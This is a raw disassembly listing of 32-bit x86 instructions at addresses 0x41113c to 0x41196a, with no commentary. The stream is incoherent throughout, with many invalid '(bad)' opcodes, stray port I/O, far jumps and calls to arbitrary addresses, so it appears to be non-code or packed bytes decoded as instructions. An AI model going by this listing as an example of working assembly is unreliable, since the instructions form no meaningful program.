  41113c:	xor    DWORD PTR [esi],ebx
  41113e:	lods   eax,DWORD PTR ds:[esi]
  41113f:	mov    ebx,0x62123701
  411144:	test   al,0x4e
  411146:	pop    edi
  411147:	fdiv   DWORD PTR [ebx+0x6226ad9e]
  41114d:	imul   edx,edi,0x39
  411150:	mov    esp,0x42abdd9e
  411155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411156:	rcr    DWORD PTR [edi],cl
  411158:	adc    al,0x2a
  41115a:	int3   
  41115b:	ja     0x411140
  41115d:	out    0x62,eax
  41115f:	fcmovu st,st(7)
  411161:	adc    eax,0x1f095b6b
  411166:	es mov esp,0x76e2c77b
  41116c:	push   0x94575f72
  411171:	not    DWORD PTR [ecx+0x1c61163f]
  411177:	mov    al,0xc7
  411179:	test   al,0x68
  41117b:	mov    bh,0xe1
  41117d:	mov    eax,ds:0xc03b1707
  411182:	je     0x4111d5
  411184:	daa    
  411185:	out    dx,eax
  411186:	fst    QWORD PTR [esi]
  411188:	jb     0x411147
  41118a:	mov    bh,0xb
  41118c:	or     al,0xa6
  41118e:	lea    ecx,[eax]
  411190:	dec    ecx
  411191:	fcom   DWORD PTR [eax-0x34]
  411194:	sub    edi,DWORD PTR [eax-0x661c8e50]
  41119a:	lds    ecx,FWORD PTR [eax]
  41119c:	mov    WORD PTR [edi+0x2fba4797],ds
  4111a2:	call   0x84734b89
  4111a7:	mov    eax,DWORD PTR [esp+eax*2-0x4e]
  4111ab:	ins    DWORD PTR es:[edi],dx
  4111ac:	test   DWORD PTR [esi],ebp
  4111ae:	sbb    BYTE PTR [edx+0x68f3d9bb],0x64
  4111b5:	pop    esp
  4111b6:	cmp    al,0xba
  4111b8:	ror    DWORD PTR [esi+eiz*2+0x17],cl
  4111bc:	sahf   
  4111bd:	icebp  
  4111be:	lods   al,BYTE PTR ds:[esi]
  4111bf:	and    eax,0x1e35889d
  4111c4:	sub    BYTE PTR [esi+edi*4-0xb2d85c9],cl
  4111cb:	mov    ch,0xbc
  4111cd:	xchg   DWORD PTR [ebx+0x1d],ebx
  4111d0:	mov    al,ds:0x6ffb3a7a
  4111d5:	repnz mov ch,dl
  4111d8:	outs   dx,BYTE PTR ds:[esi]
  4111d9:	mov    bl,0x34
  4111db:	in     al,0xd5
  4111dd:	jmp    0xe3bf:0xdc18858c
  4111e4:	xor    eax,0x16b04592
  4111e9:	mov    edx,edi
  4111eb:	jp     0x4111c7
  4111ed:	push   esp
  4111ee:	mov    edi,0x342fced8
  4111f3:	idiv   BYTE PTR [esi+0x498b110]
  4111f9:	jae    0x4111c1
  4111fb:	aad    0xd2
  4111fd:	sub    BYTE PTR [edi],ch
  4111ff:	dec    ebp
  411200:	loopne 0x411269
  411202:	idiv   DWORD PTR [ecx-0x69ac73bc]
  411208:	(bad)  [ebp-0x5d48eadd]
  41120e:	mov    eax,0xffeb80c5
  411213:	jp     0x41122e
  411215:	dec    edi
  411216:	sub    al,0x5d
  411218:	(bad)  
  411219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121a:	jl     0x41128a
  41121c:	push   esi
  41121d:	repz jp 0x4111e7
  411220:	packsswb mm3,mm3
  411223:	(bad)  [ecx+eiz*8+0x6a8f145e]
  41122a:	sbb    DWORD PTR [edx+0x29b096e0],ecx
  411230:	jno    0x411211
  411232:	bnd jns 0x411206
  411235:	sbb    al,0xb5
  411237:	cmc    
  411238:	xlat   BYTE PTR ds:[ebx]
  411239:	adc    eax,0x22a6ad0d
  41123e:	xchg   ebx,eax
  41123f:	fsubr  DWORD PTR [ecx-0x5a5fc104]
  411245:	cdq    
  411246:	inc    esi
  411247:	in     eax,0xa9
  411249:	mov    edi,?
  41124b:	jge    0x411229
  41124d:	xchg   ebp,eax
  41124e:	dec    ecx
  41124f:	je     0x411294
  411251:	pusha  
  411252:	loopne 0x411256
  411254:	pop    eax
  411255:	lahf   
  411256:	mov    ds:0x5048987b,eax
  41125b:	cmp    ch,bl
  41125d:	int    0x9e
  41125f:	push   es
  411260:	pusha  
  411261:	ror    ecx,1
  411263:	mov    ebp,0x16cf8aa3
  411268:	inc    ebx
  411269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41126a:	cmp    ebx,DWORD PTR [eax]
  41126c:	shr    dl,0xda
  41126f:	inc    esp
  411270:	fmul   QWORD PTR [ebx+edi*4+0x70c5be58]
  411277:	xchg   esp,eax
  411278:	mov    ebx,0xf5f4f019
  41127d:	shl    DWORD PTR [edi+0x11],0xa2
  411281:	loop   0x411234
  411283:	pop    ds
  411284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411285:	ins    DWORD PTR es:[edi],dx
  411286:	(bad)  
  411287:	push   eax
  411288:	in     eax,dx
  411289:	xchg   ebp,eax
  41128a:	aad    0xde
  41128c:	ss and eax,0x6a6e6ccc
  411292:	fistp  DWORD PTR [esi+eax*2]
  411295:	adc    al,0x2b
  411297:	loopne 0x411278
  411299:	push   0x8ae8fa78
  41129e:	jmp    0x1422:0x9d30026a
  4112a5:	dec    edi
  4112a6:	scas   al,BYTE PTR es:[edi]
  4112a7:	ja     0x4112b6
  4112a9:	(bad)  
  4112aa:	rcl    ebp,0xf2
  4112ad:	mov    ebp,0xa1ff362f
  4112b2:	jns    0x4112f4
  4112b4:	jb     0x4112d1
  4112b6:	cmp    al,0xf
  4112b8:	loopne 0x411323
  4112ba:	mov    esi,0x300c208d
  4112bf:	pop    eax
  4112c0:	shl    ebx,0xca
  4112c3:	cld    
  4112c4:	out    0x5a,al
  4112c6:	and    esp,DWORD PTR [esi*1-0x135f1982]
  4112cd:	xchg   ecx,eax
  4112ce:	mov    ds:0x98617ddc,eax
  4112d3:	test   al,0x5c
  4112d5:	clc    
  4112d6:	sub    al,0xf9
  4112d8:	(bad)  
  4112d9:	cmp    edx,DWORD PTR [ebp+0x36]
  4112dc:	cmp    eax,0x66973ef3
  4112e1:	or     eax,0x2466030b
  4112e6:	mov    BYTE PTR [edi+0x319103ec],dl
  4112ec:	lea    ebx,[ebx+eax*1-0x2042e761]
  4112f3:	pop    ecx
  4112f4:	icebp  
  4112f5:	mov    ds:0xef6d4a16,al
  4112fa:	dec    ebp
  4112fb:	sub    esi,DWORD PTR [edi-0x21ca0da5]
  411301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411302:	inc    edx
  411303:	je     0x41135b
  411305:	pop    es
  411306:	ret    0x8124
  411309:	sbb    al,0x9b
  41130b:	stos   BYTE PTR es:[edi],al
  41130c:	lea    ebx,[ecx-0x7f]
  41130f:	ins    BYTE PTR es:[edi],dx
  411310:	xchg   ecx,edi
  411312:	imul   edi,DWORD PTR [esp+ecx*1-0x4998052c],0x963beb38
  41131d:	push   edi
  41131e:	test   BYTE PTR [ecx+0x58],0x9c
  411322:	rol    DWORD PTR [edx],cl
  411324:	inc    ebx
  411325:	int3   
  411326:	in     eax,dx
  411327:	xor    DWORD PTR [ecx],edx
  411329:	in     eax,0x5b
  41132b:	scas   al,BYTE PTR es:[edi]
  41132c:	mov    dh,0x53
  41132e:	in     al,dx
  41132f:	push   esp
  411330:	add    eax,0x13b51c97
  411335:	pop    ds
  411336:	int    0x2c
  411338:	cmp    dl,BYTE PTR [ecx]
  41133a:	pop    ss
  41133b:	inc    esi
  41133c:	hlt    
  41133d:	or     BYTE PTR [eax-0x40],dl
  411340:	fmul   st(6),st
  411342:	jmp    0xeb2e:0x1d77e2e5
  411349:	inc    ecx
  41134a:	dec    ecx
  41134b:	push   edi
  41134c:	sbb    eax,0xe7d402c3
  411351:	xchg   esp,eax
  411352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411353:	dec    esp
  411354:	js     0x4113d2
  411356:	cli    
  411357:	dec    edi
  411358:	cmp    esp,esp
  41135a:	pop    edx
  41135b:	imul   BYTE PTR [ecx+0x1e]
  41135e:	ds or  eax,0x7a303eaf
  411364:	xchg   ebx,eax
  411365:	cmp    BYTE PTR [eax],cl
  411367:	cwde   
  411368:	jbe    0x41138f
  41136a:	(bad)  
  41136b:	mov    ?,WORD PTR [esi]
  41136d:	mov    edi,0x63d85ee6
  411372:	mov    dh,0x5b
  411374:	and    eax,0xea49b90a
  411379:	push   dx
  41137b:	std    
  41137c:	xor    esi,esi
  41137e:	dec    edi
  41137f:	sub    edi,edi
  411381:	test   bl,0xad
  411384:	mov    WORD PTR [eax+0x4],ds
  411387:	or     BYTE PTR [ebx+0x49dff304],dl
  41138d:	pop    ds
  41138e:	xor    ecx,DWORD PTR [ebx+0x77]
  411391:	inc    esp
  411392:	aas    
  411393:	aam    0x39
  411395:	mov    ecx,0x83737e69
  41139a:	aad    0xfa
  41139c:	mov    dl,0x92
  41139e:	cmp    esp,esi
  4113a0:	sub    eax,0x2b5e6ab9
  4113a5:	sbb    bl,BYTE PTR [eax+ebp*4]
  4113a8:	addr16 or eax,0xf09090d1
  4113ae:	dec    eax
  4113af:	sbb    bh,BYTE PTR ds:0x1e75e3fb
  4113b5:	jbe    0x4113b5
  4113b7:	int3   
  4113b8:	in     al,0x8b
  4113ba:	jae    0x411428
  4113bc:	jmp    0x4aa6:0x9ca0bf36
  4113c3:	mov    cl,0x56
  4113c5:	pusha  
  4113c6:	xchg   ebp,eax
  4113c7:	lock push ss
  4113c9:	std    
  4113ca:	dec    ecx
  4113cb:	cmp    al,cl
  4113cd:	mov    cl,0x84
  4113cf:	call   0x5c11be9e
  4113d4:	xchg   edi,eax
  4113d5:	jno    0x411453
  4113d7:	repz into 
  4113d9:	pop    ebx
  4113da:	arpl   dx,bp
  4113dc:	jne    0x411393
  4113de:	ds pop ebp
  4113e0:	mov    esi,0xe351d1c4
  4113e5:	out    0x85,eax
  4113e7:	pop    edi
  4113e8:	lods   al,BYTE PTR ds:[esi]
  4113e9:	jmp    0x3ba2628a
  4113ee:	sbb    BYTE PTR [esi+0x5c],0x85
  4113f2:	mov    bh,0xc4
  4113f4:	sbb    esp,DWORD PTR [edi-0x13]
  4113f7:	test   DWORD PTR [edi],0x2a95110b
  4113fd:	cmp    ebx,DWORD PTR [ebx+0x72]
  411400:	sahf   
  411401:	ss pusha 
  411403:	inc    ebp
  411404:	cmp    DWORD PTR [eax+0x5a],edx
  411407:	cli    
  411408:	fiadd  DWORD PTR [ebx]
  41140a:	xlat   BYTE PTR ds:[ebx]
  41140b:	retf   0x811d
  41140e:	push   edi
  41140f:	jo     0x4113d7
  411411:	mov    WORD PTR [edx-0x7],cs
  411414:	outs   dx,DWORD PTR ds:[esi]
  411415:	or     al,0x4f
  411417:	xor    esi,DWORD PTR [ebx-0x5c43cca9]
  41141d:	sbb    al,0xc8
  41141f:	jnp    0x4113b2
  411421:	mov    esp,ss
  411423:	out    0xe4,eax
  411425:	mov    dh,0x76
  411427:	fwait
  411428:	inc    edi
  411429:	cmp    eax,0x7bf9f765
  41142e:	test   DWORD PTR [esp+edi*8],0x99a3ef91
  411435:	push   cs
  411436:	mov    ah,0x5
  411438:	sahf   
  411439:	xchg   ecx,eax
  41143a:	jns    0x41148a
  41143c:	loopne 0x411498
  41143e:	inc    esi
  41143f:	xor    DWORD PTR [eax],edi
  411441:	int3   
  411442:	and    ah,BYTE PTR gs:[eax]
  411445:	loopne 0x41149c
  411447:	add    BYTE PTR [eax],dh
  411449:	fwait
  41144a:	sub    ebp,esp
  41144c:	arpl   WORD PTR [esi+eax*1+0x674d5eea],sp
  411453:	ins    BYTE PTR es:[edi],dx
  411454:	stc    
  411455:	call   0xf51b95b4
  41145a:	fcmovnu st,st(1)
  41145c:	push   ecx
  41145d:	sbb    bh,dl
  41145f:	or     BYTE PTR [esi-0x639dea7e],cl
  411465:	fisub  WORD PTR [ebp+0x6c4e87b9]
  41146b:	dec    edx
  41146c:	je     0x411480
  41146e:	sti    
  41146f:	xlat   BYTE PTR ds:[ebx]
  411470:	arpl   bp,cx
  411472:	push   esp
  411473:	push   esp
  411474:	jne    0x411478
  411476:	cmp    ax,0x124a
  41147a:	ds pusha 
  41147c:	outs   dx,BYTE PTR ds:[esi]
  41147d:	xor    eax,0x546ece52
  411482:	(bad)  
  411483:	pop    edx
  411484:	jg     0x411502
  411486:	xor    bl,BYTE PTR [esi+0x614f0b0a]
  41148c:	daa    
  41148d:	sub    al,0xd4
  41148f:	sbb    BYTE PTR [ebx],0x0
  411492:	inc    esi
  411493:	clc    
  411494:	cmc    
  411495:	in     al,dx
  411496:	(bad)  
  411497:	ret    0xcc53
  41149a:	sub    edi,DWORD PTR [ecx+0x65]
  41149d:	cmp    DWORD PTR [edi],0x6be844bd
  4114a3:	out    0x23,eax
  4114a5:	and    BYTE PTR [ecx+0x6c],bh
  4114a8:	mov    ah,0xe9
  4114aa:	pop    ss
  4114ab:	loop   0x411457
  4114ad:	push   ecx
  4114ae:	call   DWORD PTR [esi+eax*1-0x535bd801]
  4114b5:	cli    
  4114b6:	scas   eax,DWORD PTR es:[di]
  4114b8:	dec    edi
  4114b9:	cmp    ah,BYTE PTR [edx-0x3eb89855]
  4114bf:	jae    0x411519
  4114c1:	push   0xffffffba
  4114c3:	test   DWORD PTR es:[eax+0x24362416],edi
  4114ca:	xor    DWORD PTR [ecx-0x3c],esi
  4114cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ce:	sbb    edx,DWORD PTR [edi-0x2f]
  4114d1:	fprem  
  4114d3:	imul   BYTE PTR [esi-0x1b1bf91a]
  4114d9:	sub    al,0x4b
  4114db:	jo     0x411542
  4114dd:	jle    0x4114e1
  4114df:	adc    eax,0x48f7b6ef
  4114e4:	mov    edi,0x923f03f9
  4114e9:	(bad)  
  4114ea:	aad    0xeb
  4114ec:	in     eax,dx
  4114ed:	push   cs
  4114ee:	adc    DWORD PTR [esi],esp
  4114f0:	outs   dx,BYTE PTR ds:[esi]
  4114f1:	out    0xe0,al
  4114f3:	inc    edx
  4114f4:	dec    eax
  4114f5:	(bad)  
  4114f6:	pop    esi
  4114f7:	adc    ecx,ebp
  4114f9:	and    esi,DWORD PTR [ebx]
  4114fb:	or     eax,0x2a988b1b
  411500:	mov    edi,0xbc93cae6
  411505:	aas    
  411506:	int3   
  411507:	dec    edx
  411508:	mov    edx,0xb7e3382b
  41150d:	or     eax,0x642485ab
  411512:	(bad)  [ebp+0x6d]
  411515:	mov    ah,0xd4
  411517:	jns    0x41150d
  411519:	dec    edi
  41151a:	sub    ch,BYTE PTR [ecx+0x1e]
  41151d:	retf   0xe43
  411520:	lock adc al,bl
  411523:	sbb    eax,0xd6b81fa0
  411528:	imul   ebp,DWORD PTR [edx+0x7d3daead],0xcfcdfed8
  411532:	and    esi,DWORD PTR [edx]
  411534:	sti    
  411535:	or     eax,0x3029699a
  41153a:	rcr    BYTE PTR [esi-0x112940d0],0xd9
  411541:	mov    esi,0xff307723
  411546:	sub    BYTE PTR [esi],al
  411548:	adc    bl,ah
  41154a:	adc    eax,0x478eacb7
  41154f:	push   edx
  411550:	push   es
  411551:	push   ebx
  411552:	and    al,0xef
  411554:	sbb    al,0x13
  411556:	(bad)  
  411557:	addr16 in al,0x91
  41155a:	sub    BYTE PTR [ebp-0x46],ah
  41155d:	fbstp  TBYTE PTR ds:0xa513453c
  411563:	adc    bh,BYTE PTR [ebp+0xe267f22]
  411569:	mov    bh,0xd2
  41156b:	pop    edi
  41156c:	and    edx,edi
  41156e:	mov    edi,0x3d9f853
  411573:	xor    cl,ch
  411575:	adc    BYTE PTR [edx],0xfe
  411578:	sbb    al,0x49
  41157a:	mov    ebx,0xe96ca3f1
  41157f:	and    DWORD PTR [ecx+eiz*2],eax
  411582:	push   cs
  411583:	pop    ebx
  411584:	cmp    DWORD PTR [edx+0x2ea37197],0x0
  41158b:	and    al,0xcf
  41158d:	out    0xf,al
  41158f:	in     al,0xf
  411591:	sub    dl,BYTE PTR [esp+edi*2]
  411594:	sub    ch,BYTE PTR [esi-0x2a71899a]
  41159a:	das    
  41159b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41159c:	fild   DWORD PTR [eax-0x5c]
  41159f:	hlt    
  4115a0:	mov    edx,0x42954861
  4115a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a6:	data16 add bl,BYTE PTR [ecx-0xa]
  4115aa:	inc    esp
  4115ab:	xor    DWORD PTR ds:0x78799426,edx
  4115b1:	mov    ch,0xf9
  4115b3:	sub    BYTE PTR es:[esi],dh
  4115b6:	mov    ebp,0x49647354
  4115bb:	push   cs
  4115bc:	push   ss
  4115bd:	xor    esi,DWORD PTR [eax]
  4115bf:	xchg   ecx,eax
  4115c0:	cs push edi
  4115c2:	sub    eax,0x4a4ba153
  4115c7:	xchg   ebp,eax
  4115c8:	loopne 0x4115d0
  4115ca:	pop    ebx
  4115cb:	popa   
  4115cc:	aaa    
  4115cd:	xchg   edi,eax
  4115ce:	stos   BYTE PTR es:[edi],al
  4115cf:	cmp    DWORD PTR [esp+ebx*8+0x3f],ebx
  4115d3:	jbe    0x411651
  4115d5:	xor    BYTE PTR [ecx+esi*8+0x5ca788e6],0xd0
  4115dd:	xor    ch,BYTE PTR [esi+0x2d770bd0]
  4115e3:	dec    esp
  4115e4:	xor    edx,0x6431f063
  4115ea:	stos   BYTE PTR es:[edi],al
  4115eb:	push   cs
  4115ec:	popa   
  4115ed:	pop    edx
  4115ee:	fidivr WORD PTR [edx]
  4115f0:	ja     0x4115b3
  4115f2:	jb     0x4115bd
  4115f4:	jns    0x411585
  4115f6:	jg     0x411606
  4115f8:	add    al,0x3d
  4115fa:	shl    ebx,0x80
  4115fd:	(bad)  
  4115fe:	mov    bl,0x7b
  411600:	inc    esp
  411601:	fsubr  st(2),st
  411603:	mov    ch,0x95
  411605:	imul   ebx,edi,0x5013321d
  41160b:	mov    ebx,0xca3bde48
  411610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411611:	cmp    bl,dl
  411613:	inc    esp
  411614:	imul   ebx,DWORD PTR [esi+0x54ac22c0],0xe3e958e0
  41161e:	or     eax,0xd5589800
  411623:	out    0x9d,eax
  411625:	inc    edx
  411626:	or     BYTE PTR [edi+0xf],dl
  411629:	popa   
  41162a:	lock sahf 
  41162c:	ret    0x58f3
  41162f:	xchg   esp,eax
  411630:	mov    ebp,0x7650caf0
  411635:	jecxz  0x4115d9
  411637:	(bad)  
  411638:	cmp    DWORD PTR [esi-0x73],edi
  41163b:	cmp    eax,0x6d7f42ae
  411640:	cmp    BYTE PTR [ebp+0x46],dl
  411643:	leave  
  411644:	add    eax,0xbd2d97c9
  411649:	jmp    0x40bfce3f
  41164e:	fucomip st,st(3)
  411650:	push   ebx
  411651:	push   ds
  411652:	xchg   ebx,eax
  411653:	cmp    DWORD PTR [esi-0x6],edx
  411656:	inc    ebp
  411657:	pop    ebp
  411659:	pop    esi
  41165a:	enter  0x979d,0x83
  41165e:	call   0x2840:0x31cccbb9
  411665:	sub    eax,0x9ca3f139
  41166a:	push   esp
  41166b:	cmp    BYTE PTR [ebx],dl
  41166d:	es iret 
  41166f:	sub    DWORD PTR [ecx+0xaffb158],esi
  411675:	scas   eax,DWORD PTR es:[edi]
  411676:	pushf  
  411677:	retf   
  411678:	and    DWORD PTR [edi-0x54],esi
  41167b:	ret    0x5281
  41167e:	pop    edi
  41167f:	mov    edx,0xf4abf720
  411684:	gs in  al,dx
  411686:	jmp    0x411695
  411688:	xchg   ebp,eax
  411689:	repnz out dx,al
  41168b:	push   ebx
  41168c:	jle    0x4116a4
  41168e:	cld    
  41168f:	lds    ebx,FWORD PTR ds:0x76f014d4
  411695:	jbe    0x4116ef
  411697:	pop    edx
  411698:	pop    es
  411699:	int3   
  41169a:	pop    ecx
  41169b:	pop    esp
  41169c:	cmp    esp,edi
  41169e:	add    eax,0xc88e4d61
  4116a3:	xor    ebp,eax
  4116a5:	cmp    edi,eax
  4116a7:	pop    esp
  4116a8:	in     al,dx
  4116a9:	mov    eax,ds:0xa06f9144
  4116ae:	jp     0x4116ca
  4116b0:	dec    ebp
  4116b1:	mov    dh,0x64
  4116b3:	adc    BYTE PTR [edx+0x13],bl
  4116b6:	sti    
  4116b7:	into   
  4116b8:	mov    ch,0xa2
  4116ba:	jge    0x411677
  4116bc:	sub    ebp,edi
  4116be:	aaa    
  4116bf:	pop    edx
  4116c0:	pop    edx
  4116c1:	ret    0xc89
  4116c4:	addr16 loope 0x4116e8
  4116c7:	inc    esi
  4116c8:	addr16 call 0xb345000b
  4116ce:	cmc    
  4116cf:	loopne 0x411675
  4116d1:	push   ebx
  4116d2:	cdq    
  4116d3:	or     bh,bl
  4116d5:	push   0xf
  4116d7:	hlt    
  4116d8:	pop    ds
  4116d9:	sbb    DWORD PTR [esp+ebx*4],ebx
  4116dc:	adc    bl,BYTE PTR [ecx-0x2f2f8a7a]
  4116e2:	xchg   edx,eax
  4116e3:	pusha  
  4116e4:	jbe    0x4116d2
  4116e6:	mov    ds:0xa9d85a60,eax
  4116eb:	dec    eax
  4116ec:	js     0x41171e
  4116ee:	push   0xba980056
  4116f3:	fnsave [ebp+0x25de60d]
  4116f9:	sbb    eax,0x39ad2378
  4116fe:	leave  
  4116ff:	mov    bh,0xe7
  411701:	fmul   st,st(1)
  411703:	stos   DWORD PTR es:[edi],eax
  411704:	test   ah,dh
  411706:	ror    BYTE PTR [esi-0x47b52405],cl
  41170c:	fistp  DWORD PTR ds:[esi+0x16692980]
  411713:	mov    ebp,0x3084bb96
  411718:	ja     0x411743
  41171a:	add    eax,0xf1ad5dfd
  41171f:	mov    eax,0xc05ec594
  411724:	push   ebx
  411725:	inc    ebp
  411726:	inc    ebp
  411727:	jmp    0x3141d324
  41172c:	loope  0x41172a
  41172e:	call   0x77525006
  411733:	je     0x411775
  411735:	xor    edx,esi
  411737:	mov    esi,0x19aa3ce4
  41173c:	cmc    
  41173d:	pop    ds
  41173e:	pop    DWORD PTR [edx+0x67]
  411741:	pushf  
  411742:	jp     0x411705
  411744:	sbb    BYTE PTR [ebx+ecx*1+0x646d9b02],0x32
  41174c:	(bad)  
  41174e:	xchg   ebp,eax
  41174f:	and    esp,DWORD PTR [ebx-0x69]
  411752:	push   ebp
  411753:	test   DWORD PTR [ebp+0x53],edx
  411756:	and    eax,edi
  411758:	loope  0x41170f
  41175a:	outs   dx,BYTE PTR ds:[esi]
  41175b:	mov    es:0x1258b9e,al
  411761:	out    dx,eax
  411762:	push   ss
  411763:	fdiv   QWORD PTR [edi-0x21fe2fd0]
  411769:	and    DWORD PTR ds:0x73471c10,edx
  41176f:	das    
  411770:	shr    BYTE PTR [ebp-0x2eec38c7],cl
  411776:	(bad)  
  411778:	push   esp
  411779:	jp     0x411750
  41177b:	cmp    BYTE PTR [edx+eiz*1-0x167e93aa],0x82
  411783:	mov    esi,0x14e4c35
  411788:	mov    edx,0xea216da4
  41178d:	lds    edx,FWORD PTR [edx+0x72aa962a]
  411793:	fisubr DWORD PTR [ebx+0x67]
  411796:	pop    edx
  411797:	and    BYTE PTR [ebx+0x439e57fa],0x51
  41179e:	or     BYTE PTR [ecx+0x25f820e1],0x17
  4117a5:	arpl   ax,di
  4117a7:	out    dx,al
  4117a8:	jecxz  0x411785
  4117aa:	mov    ebx,0x883c29bb
  4117af:	(bad)
  4117b2:	js     0x4117c1
  4117b4:	out    dx,al
  4117b5:	mov    ecx,0x5b2c5dd9
  4117ba:	mov    ds:0xc250f195,al
  4117bf:	ja     0x411756
  4117c1:	fwait
  4117c2:	sti    
  4117c3:	mov    ah,0x5c
  4117c5:	sbb    eax,0xcbb152f0
  4117ca:	jo     0x41182c
  4117cc:	rcr    DWORD PTR [ebp+0x575a522],1
  4117d2:	fild   DWORD PTR [ebp*1-0x35a631f]
  4117d9:	pop    ebx
  4117da:	xor    bh,BYTE PTR [edi]
  4117dc:	scas   al,BYTE PTR es:[edi]
  4117dd:	les    edx,FWORD PTR [ebx+eiz*4-0x2]
  4117e1:	cli    
  4117e2:	stos   DWORD PTR es:[edi],eax
  4117e3:	xchg   edx,eax
  4117e4:	pop    ds
  4117e5:	in     al,0x37
  4117e7:	(bad)  [ecx+0x6]
  4117ea:	push   0xe2f4ce65
  4117ef:	or     al,0x5c
  4117f1:	push   edi
  4117f2:	mov    ecx,0x6b88c1df
  4117f7:	out    0x10,al
  4117f9:	addr16 push edx
  4117fb:	mov    ah,BYTE PTR [ebx+0x642f0443]
  411801:	push   0xffffffbf
  411803:	loope  0x4117bb
  411805:	or     eax,0x55afe097
  41180a:	div    ch
  41180c:	xlat   BYTE PTR ds:[ebx]
  41180d:	lahf   
  41180e:	push   esi
  41180f:	data16 (bad) 
  411811:	add    cl,BYTE PTR [edx+eax*2-0x50]
  411815:	popa   
  411816:	mov    ecx,0x1e19781c
  41181b:	adc    al,0x6c
  41181d:	in     eax,dx
  41181e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181f:	(bad)  
  411821:	rcl    DWORD PTR [eax+0x4e],1
  411824:	mov    BYTE PTR [ecx],al
  411826:	jge    0x4117fd
  411828:	lods   al,BYTE PTR ds:[esi]
  411829:	dec    edi
  41182a:	clc    
  41182b:	fisub  WORD PTR [edx+0x310f6a16]
  411831:	div    DWORD PTR [esi]
  411833:	jmp    0x411824
  411835:	push   ebx
  411836:	mov    al,0x13
  411838:	mov    ebp,0xc4f36ae9
  41183d:	sub    dl,cl
  41183f:	dec    esi
  411840:	inc    edi
  411841:	or     eax,0xa1516784
  411846:	cmp    BYTE PTR [esi],al
  411848:	retf   0x8977
  41184b:	aam    0xb
  41184d:	cmp    dh,BYTE PTR [esi-0x5464108b]
  411853:	inc    ecx
  411854:	into   
  411855:	add    ebx,0xffffffcc
  411858:	ror    DWORD PTR [ecx-0x6e],0x67
  41185c:	sub    al,BYTE PTR [edx+0x6b]
  41185f:	cdq    
  411860:	add    esp,DWORD PTR ds:0xdde8cf7f
  411866:	jo     0x41185d
  411868:	ins    BYTE PTR es:[edi],dx
  411869:	les    ecx,FWORD PTR [edx]
  41186b:	shr    DWORD PTR [edi+0x2],1
  41186e:	pop    esp
  41186f:	out    dx,al
  411870:	mov    ecx,0xa12d2c16
  411875:	daa    
  411876:	es shl cl,1
  411879:	or     BYTE PTR [edi+0x6170d812],al
  41187f:	addr16 std 
  411881:	push   es
  411882:	into   
  411883:	lock inc esi
  411885:	and    BYTE PTR [ecx-0x16f4c7e1],ah
  41188b:	(bad)  
  41188c:	test   DWORD PTR [eax-0x3c],0x82839b0
  411893:	or     dh,0x49
  411896:	dec    esi
  411897:	sahf   
  411898:	jne    0x4118a7
  41189a:	nop
  41189b:	xchg   esp,eax
  41189c:	daa    
  41189d:	test   eax,0x4a835093
  4118a2:	dec    edi
  4118a3:	dec    edx
  4118a4:	add    bl,BYTE PTR [esi-0x22]
  4118a7:	outs   dx,BYTE PTR ds:[esi]
  4118a8:	dec    esi
  4118a9:	xchg   ebp,eax
  4118aa:	ins    BYTE PTR es:[edi],dx
  4118ab:	call   esi
  4118ad:	jo     0x411915
  4118af:	aam    0xc5
  4118b1:	leave  
  4118b2:	dec    edx
  4118b3:	ss add eax,ecx
  4118b6:	ror    DWORD PTR ds:[edx+0x25],cl
  4118ba:	mov    ebp,0xbd80590
  4118bf:	loopne 0x41186a
  4118c1:	in     eax,dx
  4118c2:	mov    eax,ds:0xfb4477b1
  4118c7:	in     eax,dx
  4118c8:	pop    edx
  4118c9:	call   0x7d3f920c
  4118ce:	xchg   edi,eax
  4118cf:	jg     0x41190c
  4118d1:	loop   0x411945
  4118d3:	shl    BYTE PTR [edx],1
  4118d5:	fdecstp 
  4118d7:	cwde   
  4118d8:	out    0x6c,al
  4118da:	paddsw xmm5,XMMWORD PTR [edx-0x46067192]
  4118e2:	js     0x4118a4
  4118e4:	pop    esi
  4118e5:	out    0x4f,eax
  4118e7:	mov    eax,0x65fa6015
  4118ec:	push   esi
  4118ed:	xchg   DWORD PTR [ebp-0x54753e76],edx
  4118f3:	adc    edx,DWORD PTR [esi+0x691dc1ed]
  4118f9:	mov    bl,0x65
  4118fb:	dec    edi
  4118fc:	test   al,0x96
  4118fe:	rol    BYTE PTR ds:0xcd4a4424,1
  411904:	mov    ds:0x35792207,eax
  411909:	adc    al,0x1c
  41190b:	ret    
  41190c:	pop    esp
  41190d:	outs   dx,DWORD PTR ds:[esi]
  41190e:	lahf   
  41190f:	sbb    ebp,DWORD PTR [ebx]
  411911:	sub    DWORD PTR [edx],0x13
  411914:	and    edx,0xffffffd5
  411917:	(bad)  
  411918:	mov    bh,0x7c
  41191a:	mov    esi,0x628f280
  41191f:	jmp    0x9316ad87
  411924:	aam    0x96
  411926:	jo     0x4118f2
  411928:	mov    esi,0xcc62387e
  41192d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41192e:	bound  esi,QWORD PTR [esi]
  411930:	mov    dl,0xae
  411932:	ins    BYTE PTR es:[edi],dx
  411933:	and    eax,0x68431fbc
  411938:	pop    ecx
  411939:	and    al,0xf6
  41193b:	addr16 jmp 0xe9f11e77
  411941:	ins    DWORD PTR es:[edi],dx
  411942:	cmp    ebp,DWORD PTR [eax+0x20]
  411945:	xor    bl,ah
  411947:	(bad)  
  411948:	mov    al,0xdd
  41194a:	push   edi
  41194b:	fmul   QWORD PTR [edx]
  41194d:	pop    edi
  41194e:	into   
  41194f:	or     DWORD PTR [edx+edx*8+0x51],ebp
  411953:	or     bh,bl
  411955:	pusha  
  411956:	addr16 cli 
  411958:	sbb    eax,0xf1683019
  41195d:	push   0xffffffd3
  41195f:	in     eax,0xb3
  411961:	xchg   ecx,eax
  411962:	push   0x48
  411964:	bound  edi,QWORD PTR [edi-0x3f1eaffa]
  41196a:	pop    es
